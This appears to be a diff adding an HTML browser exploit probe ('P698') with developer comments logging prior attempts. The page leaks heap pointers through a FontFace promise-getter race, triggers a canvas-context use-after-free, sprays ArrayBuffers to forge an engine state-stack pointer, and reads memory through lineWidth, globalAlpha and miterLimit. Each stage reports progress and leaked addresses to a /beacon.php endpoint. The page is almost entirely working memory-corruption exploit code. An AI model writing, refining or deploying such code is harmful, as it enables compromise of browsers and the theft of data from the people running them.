@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P698 — sync-beacon forge oracle (forward offsets)</title>
+<script>
+'use strict';
+/* ============================================================
+ * P698 — decisive forge oracle, synchronous beacons
+ *
+ * P697 evidence:
+ *   A-HIT p58=0x10001cbf30  -> leak OK
+ *   B-UAF ok, B-SPRAY 500-AB-only
+ *   *** died before B-FORGED ***  (process respawned 8.6s later)
+ *
+ * P694 (WITH same-type spray) instead completed and read 1337.
+ * So removing the same-type spray changes the outcome from
+ * "reads a live aliased context" to "process dies at the forge".
+ *
+ * Two possible causes, and this probe separates them:
+ *   (A) AB(768) DID reclaim the freed slot, and our forge wrote a
+ *       bogus m_stateStack.m_buffer that engine code dereferenced
+ *       -> SIGSEGV.  (This is the outcome we want: we own the object.)
+ *   (B) the AB spray itself destabilised the heap.
+ *
+ * Fixes vs P697:
+ *  1. SYNCHRONOUS beacons (open(...,false)) so ordering is provable
+ *     and nothing is lost when the process dies.
+ *  2. Beacon BEFORE and AFTER the forge loop (microseconds apart).
+ *  3. Baseline lineWidth read BEFORE any forge.
+ *  4. FORWARD-ONLY offsets: forge m_buffer = p58 (not p58-48) so
+ *     every field the engine touches (m_buffer+0/+48/+64) is at or
+ *     above p58, inside a page we know is mapped. The p58-48 trick
+ *     risks an unmapped page when p58 sits near a page start.
+ *  5. Smaller AB count first (48), so heap churn is minimal.
+ * ============================================================ */
+
+/* synchronous beacon: survives process death; ordering is provable */
+function B(tag,data){
+  try{var x=new XMLHttpRequest();
+    x.open('GET','/beacon.php?tag=P698-'+encodeURIComponent(tag)+
+      '&data='+encodeURIComponent(String(data||'').slice(0,900))+'&t='+Date.now(),false);
+    x.send(null);}catch(e){}
+}
+function hex(v){return '0x'+BigInt(v).toString(16)}
+function f64bits(v){var bb=new ArrayBuffer(8);new Float64Array(bb)[0]=v;
+  return new BigUint64Array(bb)[0]}
+function desc(bits){
+  if(bits===BigInt('0x4094e40000000000')) return 'IS-1337(SAME-TYPE-ALIAS)';
+  if(bits>=BigInt('0x1000000000')&&bits<BigInt('0x8000000000')) return 'HEAP-PTR';
+  if(bits===BigInt(0)) return 'ZERO';
+  return 'OTHER';
+}
+
+var P58=null,P68=null;
+
+function run(){
+  B('BOOT','p698-sync');
+  try{ leak(); }catch(e){ B('BOOT-ERR',(e.message||String(e)).slice(0,120)); }
+}
+
+/* ---------- FontFace leak (proven 200ms single-scan shape) ---------- */
+function leak(){
+  B('A-GO');
+  var styleEl=document.createElement('style');
+  styleEl.textContent='@font-face{font-family:s0;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(styleEl);
+  var face=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(face); void face.loaded;
+
+  var ffAbs=[], ffFired=false;
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+    get:function(){
+      if(ffFired) return undefined; ffFired=true;
+      if(styleEl){styleEl.remove(); styleEl.textContent=''; styleEl=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      for(var k=0;k<48;k++) ffAbs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em s0');}catch(e){}
+      return undefined;
+    }, set:function(){}});
+
+  document.fonts.load('1em f0, s0','AB');
+
+  setTimeout(function(){
+    var bestK=-1,bestNz=0;
+    for(var k=0;k<ffAbs.length;k++){
+      var u=new Uint8Array(ffAbs[k]),nz=0;
+      for(var j=0;j<u.length;j++) if(u[j]!==0) nz++;
+      if(nz>bestNz){bestNz=nz;bestK=k;}
+    }
+    if(bestK<0||bestNz===0){ B('A-MISS','no-hit'); return; }
+    var bv=new BigUint64Array(ffAbs[bestK]);
+    P58=bv[11]; P68=bv[13];
+    B('A-HIT','p58='+hex(P58)+'|p68='+hex(P68)+'|k='+bestK+'|nz='+bestNz);
+    B('A-NOTE','p58_page='+hex(P58 & ~BigInt(0x3FFF))+'|p68_page='+hex(P68 & ~BigInt(0x3FFF)));
+    setTimeout(forge, 25);
+  }, 200);
+}
+
+/* ---------- UAF + AB-only spray + baseline read + forge ---------- */
+function forge(){
+  B('B-GO','p58='+hex(P58));
+
+  var innerCtx2=null;
+  var canvas2=document.createElement('canvas'); canvas2.width=1; canvas2.height=1;
+  var o={};
+  Object.defineProperty(o,'alpha',{get:function(){ innerCtx2=canvas2.getContext('2d'); return true; }});
+  canvas2.getContext('bitmaprenderer', o);
+  if(!innerCtx2){ B('B-FAIL','no-ctx'); return; }
+  B('B-UAF','ok');
+
+  /* ---- AB(768) ONLY. No canvas contexts anywhere. ---- */
+  var N=48;
+  var abs=[];
+  for(var ai=0;ai<N;ai++) abs.push(new ArrayBuffer(768));
+  B('B-SPRAY','n='+N+'-AB-only');
+
+  /* BASELINE read before any forge — proves UAF state readability */
+  var base=null,baseErr=null;
+  try{ base=innerCtx2.lineWidth; }catch(e){ baseErr=(e.message||String(e)); }
+  if(baseErr!==null){ B('B-BASE-ERR',baseErr.slice(0,140)); return; }
+  B('B-BASE','lw='+base+'|bits='+hex(f64bits(base))+'|'+desc(f64bits(base)));
+
+  /* FORWARD-ONLY forge: m_buffer = p58.
+   * lineWidth  (State+48) -> mem[p58+48]
+   * miterLimit (State+64) -> mem[p58+64]
+   * globalAlpha(State+ 0) -> mem[p58]      (the leaked WeakHashSet ptr) */
+  var TARGET=P58;
+  B('B-PRE-FORGE','target='+hex(TARGET)+'|will_loop='+N);
+  for(var fi=0;fi<N;fi++){
+    var bv=new BigUint64Array(abs[fi]);
+    var u32=new Uint32Array(abs[fi]);
+    bv[14]=TARGET;   /* +112 m_stateStack.m_buffer */
+    u32[30]=1;       /* +120 m_capacity */
+    u32[31]=1;       /* +124 m_size */
+  }
+  B('B-POST-FORGE','loop-done');
+
+  /* READ 1: lineWidth -> mem[p58+48] */
+  var lw=null,err=null;
+  try{ lw=innerCtx2.lineWidth; }catch(e){ err=(e.message||String(e)); }
+  if(err!==null){ B('B-LW-ERR',err.slice(0,140)); }
+  else{
+    var bits=f64bits(lw);
+    B('B-LW','lw='+lw+'|bits='+hex(bits)+'|'+desc(bits));
+  }
+
+  /* READ 2: globalAlpha -> mem[p58]  (expect the leaked ptr itself) */
+  try{
+    var ga=innerCtx2.globalAlpha;
+    var gb=f64bits(ga);
+    B('B-GA','ga='+ga+'|bits='+hex(gb)+'|'+desc(gb));
+  }catch(e){ B('B-GA-ERR',(e.message||'').slice(0,90)); }
+
+  /* READ 3: miterLimit -> mem[p58+64] */
+  try{
+    var ml=innerCtx2.miterLimit;
+    var mb=f64bits(ml);
+    B('B-ML','ml='+ml+'|bits='+hex(mb)+'|'+desc(mb));
+  }catch(e){ B('B-ML-ERR',(e.message||'').slice(0,90)); }
+
+  B('DONE','p698-complete');
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script>
+</head><body><pre id="out">P698 — sync-beacon forge oracle</pre></body></html>
